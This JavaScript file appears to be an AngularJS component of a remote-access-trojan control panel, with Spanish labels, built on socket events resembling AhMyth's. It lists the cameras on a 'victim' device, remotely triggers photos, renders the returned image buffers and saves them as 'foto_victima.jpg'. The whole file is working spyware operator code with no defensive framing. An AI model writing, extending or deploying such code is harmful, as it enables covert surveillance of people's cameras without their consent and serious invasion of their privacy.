angular.module('myappy').directive('labCamera', function() {
  return {
    restrict: 'E',
    scope: {
      victim: '='
    },
    template:
      `<div class="ui segment">
        <h2 class="ui header">Cámara</h2>
        <div ng-if="cameras.length">
          <label>Cámara:</label>
          <select class="ui dropdown"
                  ng-model="selectedCameraId"
                  ng-options="cam.id as cam.name for cam in cameras"
                  ng-change="cameraChanged()"></select>
        </div>
        <div ng-if="!cameras.length && !errorMsg" class="ui info message">
          <strong>No hay cámaras disponibles.</strong>
        </div>
        <button class="ui labeled icon black button"
                ng-click="takePhoto()"
                ng-disabled="selectedCameraId === null || selectedCameraId === undefined || selectedCameraId === '' || takingPhoto">
          <i class="photo icon"></i>
          Tomar foto
        </button>
        <span ng-if="takingPhoto">Tomando foto...</span>
        <div ng-if="photoData" class="field">
          <label>Foto tomada:</label>
          <img ng-src="{{photoData}}" alt="Foto" class="ui image" style="max-width: 320px; max-height: 320px;">
          <button class="ui green button" ng-click="downloadPhoto()" style="margin-top:10px;">
            <i class="save icon"></i>
            Guardar foto
          </button>
        </div>
        <div class="ui red message" ng-if="errorMsg">
          {{errorMsg}}
        </div>
      </div>`,
    controller: ['$scope', function($scope) {
      $scope.cameras = [];
      $scope.selectedCameraId = null;
      $scope.photoData = null;
      $scope.takingPhoto = false;
      $scope.errorMsg = '';

      function fetchCameraList() {
        if (!$scope.victim) return;
        $scope.cameras = [];
        $scope.selectedCameraId = null;
        $scope.photoData = null;
        $scope.errorMsg = '';
        socket.emit('get-camera-list', { victimId: $scope.victim.id });
        socket.once('camera-list', function(data) {
          $scope.$apply(function() {
            try {
              let obj = typeof data === 'string' ? JSON.parse(data) : data;
              if (obj.camList && obj.list && obj.list.length) {
                $scope.cameras = obj.list.map(cam => ({
                  ...cam,
                  id: Number(cam.id)
                }));
                $scope.selectedCameraId = $scope.cameras[0].id;
                console.log("DEBUG cámaras:", $scope.cameras);
              } else {
                $scope.errorMsg = "No se encontraron cámaras disponibles";
              }
            } catch (e) {
              $scope.errorMsg = "Error al obtener lista de cámaras";
            }
          });
        });
      }

      // Debug: watcher para ver cambios de id
      $scope.$watch('selectedCameraId', function(newVal, oldVal) {
        console.log('DEBUG $scope.selectedCameraId changed:', newVal, '(antes:', oldVal, ')');
      });

      $scope.cameraChanged = function() {
        console.log("DEBUG cameraChanged, selectedCameraId=", $scope.selectedCameraId);
      };

      $scope.takePhoto = function() {
        console.log("DEBUG takePhoto: selectedCameraId=", $scope.selectedCameraId, "typeof:", typeof $scope.selectedCameraId);
        if ($scope.selectedCameraId === null || $scope.selectedCameraId === undefined || $scope.selectedCameraId === '' || $scope.takingPhoto) return;
        if (!$scope.victim) return;
        $scope.takingPhoto = true;
        $scope.photoData = null;
        $scope.errorMsg = '';
        socket.emit('get-photo', { victimId: $scope.victim.id, cameraID: Number($scope.selectedCameraId) });
        socket.once('x0000ca', function(data) {
          $scope.$apply(function() {
            $scope.takingPhoto = false;
            if (data.image && data.buffer) {
              let arr = data.buffer;
              if (arr instanceof ArrayBuffer) arr = new Uint8Array(arr);
              let binary = '';
              for (let i = 0; i < arr.length; i++) {
                binary += String.fromCharCode(arr[i]);
              }
              $scope.photoData = 'data:image/jpeg;base64,' + btoa(binary);
            } else {
              $scope.errorMsg = data.error || "Error al recibir foto";
            }
          });
        });
      };

      $scope.downloadPhoto = function() {
        if (!$scope.photoData) return;
        let link = document.createElement('a');
        link.href = $scope.photoData;
        link.download = 'foto_victima.jpg';
        link.click();
      };

      $scope.$watch('victim', function(newVal) {
        if (newVal) fetchCameraList();
      });

    }]
  };
});